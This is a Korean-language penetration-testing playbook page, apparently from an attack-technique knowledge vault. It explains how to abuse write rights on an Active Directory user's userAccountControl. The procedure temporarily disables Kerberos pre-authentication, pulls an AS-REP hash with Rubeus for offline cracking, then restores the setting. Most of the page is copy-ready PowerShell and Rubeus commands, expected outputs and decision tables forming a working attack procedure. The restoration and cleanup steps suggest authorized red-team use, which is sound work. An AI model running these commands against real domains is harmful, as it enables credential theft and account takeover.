---
tags:
  - 환경/ad
  - 서비스/kerberos
  - 서비스/ldap
시작조건: ["대상 사용자 객체의 userAccountControl 쓰기 권한 확인", "대상 계정이 Kerberos pre-authentication을 요구함"]
필요권한: ["대상 사용자 객체의 userAccountControl 속성 쓰기 또는 GenericWrite·GenericAll"]
필요조건: ["DC LDAP·Kerberos 접근", "ActiveDirectory PowerShell 모듈", "대상 사용자와 사용할 DC", "즉시 원복 가능한 변경 창"]
결과: ["일시적으로 DONT_REQ_PREAUTH가 설정된 대상 계정", "대상 사용자의 AS-REP hash 또는 요청 실패", "복구 확인된 원래 pre-authentication 상태"]
---

# 임시 DONT_REQ_PREAUTH 설정과 AS-REP 요청

## 한 줄 판단

현재 AD Identity가 대상 사용자 객체의 `userAccountControl`을 쓸 수 있고 대상이 원래 Kerberos pre-authentication을 요구한다면, 같은 DC에서 `DONT_REQ_PREAUTH`만 짧게 활성화해 AS-REP hash를 요청한 뒤 성공 여부와 관계없이 즉시 원래 값을 복원한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 실행 위치와 경로 | Windows PowerShell→DC LDAP, AS-REP 요청 위치→같은 DC Kerberos 88 | 기본 AD 사용자 조회와 88/TCP 도달 확인 | DNS·DC FQDN·피벗과 LDAP/Kerberos 경로 확인 |
| 현재 AD Identity | 실제 ACE를 행사할 인증 주체 | `whoami`, 현재 ticket와 LDAP 조회 주체 확인 | 로컬 사용자·다른 `/netonly`·ticket context를 구분 |
| 현재 권한 | 대상 사용자 `userAccountControl` 쓰기 또는 이를 포함하는 `GenericWrite`·`GenericAll` | [[AD ACL 권한 열거와 공격 경로 식별]]에서 대상 DN·주체 SID·allow/deny 확인 | 다른 객체나 그룹에 대한 권한을 사용자 권한으로 확대하지 않음 |
| 대상 기준선 | 대상이 enabled이고 `DoesNotRequirePreAuth = False` | 같은 `<DC_FQDN>`에 `Get-ADUser` 실행 | 이미 `True`이면 변경하지 않고 [[AS-REP Roasting]] 사용 |
| 복구 조건 | 변경 직후 같은 DC에서 원래 값으로 되돌릴 수 있는 세션 | `Set-ADAccountControl` module·권한과 원격 연결 유지 확인 | 복구 경로가 없으면 변경하지 않음 |

`DONT_REQ_PREAUTH`는 `userAccountControl`의 `0x00400000` bit다. 다른 UAC bit를 정수 덮어쓰기로 교체하지 않고, Microsoft cmdlet의 전용 Boolean parameter로 이 bit만 바꾼다.

## 실행

### 1. 대상과 원래 값 기록

```powershell
Import-Module ActiveDirectory
$before = Get-ADUser -Identity '<TARGET_USER>' -Server '<DC_FQDN>' -Properties Enabled,DoesNotRequirePreAuth,userAccountControl
$before | Select-Object SamAccountName,DistinguishedName,Enabled,DoesNotRequirePreAuth,userAccountControl
```

확인할 출력:

- 요청한 사용자와 `DistinguishedName`이 실제 ACE 대상과 일치한다.
- `Enabled = True`, `DoesNotRequirePreAuth = False`임을 확인한다.
- `True`이면 이 문서의 변경을 수행하지 않는다. 해당 계정은 기존 [[AS-REP Roasting]]의 대상이다.

### 2. 변경 preview와 짧은 활성화

승인된 대상·시간 창에서 `-WhatIf`가 같은 사용자와 DC를 가리키는지 먼저 확인한다.

```powershell
Set-ADAccountControl -Identity '<TARGET_USER>' -Server '<DC_FQDN>' -DoesNotRequirePreAuth $true -WhatIf
Set-ADAccountControl -Identity '<TARGET_USER>' -Server '<DC_FQDN>' -DoesNotRequirePreAuth $true
Get-ADUser -Identity '<TARGET_USER>' -Server '<DC_FQDN>' -Properties DoesNotRequirePreAuth,userAccountControl |
  Select-Object SamAccountName,DoesNotRequirePreAuth,userAccountControl
```

확인할 출력:

- `Set-ADAccountControl`은 기본적으로 객체를 반환하지 않는다. 후속 조회에서 같은 계정의 `DoesNotRequirePreAuth = True`가 보여야 변경 성공이다.
- access denied이면 현재 주체의 실제 속성 쓰기 권한을, 객체 없음이면 사용자 identity와 `-Server`를 확인한다.

### 3. 같은 DC에서 AS-REP hash 요청

Windows PowerShell에서 Rubeus를 사용하는 대표 경로다. `<ASREP_HASH_FILE>`은 Vault 밖의 기존에 없는 exact 파일로 정한다.

```powershell
Test-Path -LiteralPath '<ASREP_HASH_FILE>'
.\Rubeus.exe asreproast /user:<TARGET_USER> /dc:<DC_FQDN> /nowrap /format:hashcat /outfile:<ASREP_HASH_FILE>
```

확인할 출력:

- `AS-REQ w/o preauth successful!`와 `$krb5asrep$` 형식 파일이 함께 있어야 AS-REP 자료 수집 성공이다.
- 사용자 조회·UAC 변경 성공만으로 hash 발급이나 비밀번호 복구를 단정하지 않는다.
- 요청이 실패해도 다음 원복을 먼저 수행하고, 그 뒤 realm·시간·DC 88 도달성과 계정 상태를 조사한다.

## 변경 영향과 복구

AS-REP 결과를 얻었는지와 관계없이 다른 후속 작업보다 먼저 같은 DC에서 원래 `False`로 복원한다.

```powershell
Set-ADAccountControl -Identity '<TARGET_USER>' -Server '<DC_FQDN>' -DoesNotRequirePreAuth $false
$after = Get-ADUser -Identity '<TARGET_USER>' -Server '<DC_FQDN>' -Properties Enabled,DoesNotRequirePreAuth,userAccountControl
$after | Select-Object SamAccountName,Enabled,DoesNotRequirePreAuth,userAccountControl
```

완료 기준:

- 같은 대상의 `DoesNotRequirePreAuth = False`가 확인된다.
- 이 cmdlet으로 건드리지 않은 다른 UAC bit는 원래 정수로 강제 덮어쓰지 않는다. 동시 관리 변경이 의심되면 `$before.userAccountControl`과 `$after.userAccountControl` 차이를 관리자와 대조한다.
- 여러 DC를 사용하는 환경에서는 지정 DC의 복구 뒤 필요한 replica에서도 값이 돌아왔는지 확인한다. 복제를 확인하지 못하면 `지정 DC 복구 확인, 다른 replica 미확인`으로 남긴다.
- LDAP 변경·KDC 요청 감사 흔적과 변경 창 동안 제3자가 AS-REP를 요청했을 가능성은 되돌릴 수 없다.

로컬 hash 파일은 필요한 인계 후 이번 작업에서 만든 exact 경로만 제거한다.

```powershell
if (Test-Path -LiteralPath '<ASREP_HASH_FILE>') { Remove-Item -LiteralPath '<ASREP_HASH_FILE>' -Force }
Test-Path -LiteralPath '<ASREP_HASH_FILE>'
```

마지막 출력이 `False`여야 로컬 파일 정리 완료다. UAC 복구, 로컬 파일 정리와 남는 감사·노출 영향은 별도로 판정한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 원래 값이 이미 `True` | 변경 없이 AS-REP 요청 가능 | 기존 취약 설정 | [[AS-REP Roasting]] |
| `True` 변경과 `$krb5asrep$` 확인 | 일시 설정으로 AS-REP 자료 수집 성공 | 오프라인 hash | 먼저 `False` 복구 후 [[오프라인 해시 크래킹]] |
| 변경 성공, AS-REP 요청 실패 | 계정 변경과 요청 성공은 별개 | 대상 설정만 변경됨 | 즉시 복구 후 DC·realm·시간·계정 상태 확인 |
| 복구 조회가 `False` | 지정 DC에서 원래 pre-authentication 요구 상태 복원 | 지정 DC 복구 확인 | 필요 replica 확인과 로컬 hash 정리 |
| 복구가 거부되거나 조회 불가 | 대상 계정에 보안상 취약한 변경이 남을 수 있음 | 복구 미완료 | 다른 작업을 중단하고 같은 대상·DC·권한으로 관리자 복구 요청 |

## 관련 공격기법

- [[AD ACL 권한 열거와 공격 경로 식별]]
- [[AS-REP Roasting]]
- [[오프라인 해시 크래킹]]

## 관련 도구

- [[ActiveDirectory PowerShell 모듈]]
- [[rubeus]]

## 관련 상태 라우터

- [[AD 객체 제어권 확보 후 악용 경로 선택]]
- [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 참고 링크

- [Microsoft: Set-ADAccountControl](https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountcontrol?view=windowsserver2022-ps)
- [Microsoft: UserAccountControl property flags](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
- [Microsoft Open Specifications: userAccountControl Bits](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/dd302fd1-0aa7-406b-ad91-2a6b35738557)
